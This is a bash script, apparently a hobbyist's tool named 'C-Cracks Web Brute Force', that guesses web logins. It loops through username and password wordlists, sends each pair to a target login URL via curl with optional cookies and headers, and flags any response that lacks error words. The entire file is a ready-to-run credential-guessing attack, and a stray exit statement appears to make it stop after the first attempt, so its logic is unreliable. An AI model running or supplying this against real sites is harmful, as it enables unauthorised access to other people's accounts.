#!/bin/bash

user_f=$1 ; pass_f=$2 ;  method=$3 ; cookie=$5 ; header=$6

# help menu
figlet "C-Cracks" ; figlet "Web Brute Force"
if [[ $( echo "$1" | grep "help" ) ]]; then
	echo "Script is based on positional arguments, see below:"
	echo "Example:  ./brute-force.sh ./users.txt ./pass.txt post http://192.168.0.20/wp-login.php \"cookie user=uuu;aaa=sss\" \"header s\\\$ss: rr;aaa: bbb\" \"log={user}&pwd={pass}\" (escaping special chars shown too)"
	echo "Example 2: ./brute-force.sh users.txt passes.txt get http://www.google.com/?user={user}&pass={pass}"
	exit 0
fi

# altering the provided vals for headers and cookies to pass through cURL
# also made an attempt to strip whitespace but there still seems to be whitespace present in cURL output
# I opted to leave as is resultingly and I will look at again if the whitespace turns out to be problematic
if [[ $( echo "$header" | grep "header " ) ]] ; then
	IFS=";" ; headers=( `echo "${header//header/}" | sed -e 's/^[ \t]*//'` )
	headers=( "${headers[@]/#/-H }" )
elif [[ $( echo "$cookie" | grep "header " ) ]] ; then
	IFS=";" ;headers=( `echo "${cookie//header/}" | sed -e 's/^[ \t]*//'` )
	headers=( "${headers[@]/#/-H }" )
fi

if [[ $( echo "$cookie" | grep "cookie " ) ]] ; then
	IFS="" ; cookies=( `echo "${cookie//cookie/}" | sed -e 's/^[ \t]*//'` )
	cookies=( "${cookies[@]/#/-b }" ) 
fi

IFS=""

# begin loop of user and pass files 
echo -e "Brute force in progress...\n"
while IFS="" read -r u || [ -n "$u" ]
do
	while IFS="" read -r p || [ -n "$p" ]
	do
		url=$4 
		case "$method" in
			"get"|"g"|"G"|"GET")
				url=$( echo "${url}" | sed -e s/{user}/"$u"/g -e s/{pass}/"$p"/g ) 
				if [[ $( curl -v "${url}" -s --insecure "${cookies[@]}" "${headers[@]}" 2>&1 | grep -E -- "Invalid|invalid|incorrect|wrong|Incorrect|Wrong|Fail|fail|ERROR|error" ) ]] ; then
					echo "$u:$p = Nope." && continue
				else echo -e "$u:$p = Intriguing. ;3\nIf this was the first result, however, please check the cURL command once manually as an error can refuce a false positive." && exit 0
				fi 
				;;
			"POST"|"P"|"p"|"post")
				if [[ $( echo "$header" | grep -v "header " ) ]] ; then data=$6
				elif [[ $( echo "$cookie" | grep -v "header " ) ]] && [[ $( echo "$cookie" | grep -v "cookie " ) ]]; then data=$5
				else data=$7
				fi

				data=$( echo "${data}" | sed -e s/{user}/"$u"/g -e s/{pass}/"$p"/g ) ; echo curl -v "${url}" -s --insecure "${cookies[@]}" "${headers[@]}" -d "${data}"
				if [[ $( curl -v "${url}" -s --insecure "${cookies[@]}" "${headers[@]}" -d "${data}" 2>&1 |  grep -E -- "Invalid|invalid|incorrect|wrong|Incorrect|Wrong|Fail|fail|ERROR|error" ) ]] ; then 
					echo "$u:$p = Nope." && continue
				else echo -e "$u:$p = Intriguing. ;3\nIf this was the first result, however, please check the cURL command once manually as an error can refuce a false positive." && exit 0
				fi
				;;
			*) echo "Provided method is invalid." ;;
		esac
		exit 0
	done < "$pass_f"
done < "$user_f"
